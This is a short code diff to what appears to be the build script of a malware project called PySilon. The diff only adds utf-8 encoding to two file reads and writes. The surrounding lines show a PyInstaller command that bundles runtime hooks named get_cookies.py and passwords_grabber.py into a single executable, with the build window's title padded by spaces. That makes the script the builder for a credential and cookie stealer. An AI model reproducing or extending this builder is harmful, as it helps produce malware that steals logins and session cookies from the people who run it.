@@ -68,8 +68,8 @@ if input('Would you like to set a custom icon to compiled executable? Y/n ').low
 pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python tools/PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
-with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
-with open('main_prepared.py', 'w') as edit_source_code:
+with open('main.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
+with open('main_prepared.py', 'w', encoding='utf-8') as edit_source_code:
     for line in range(len(source_code)):
         if mode == 1:
             match line:
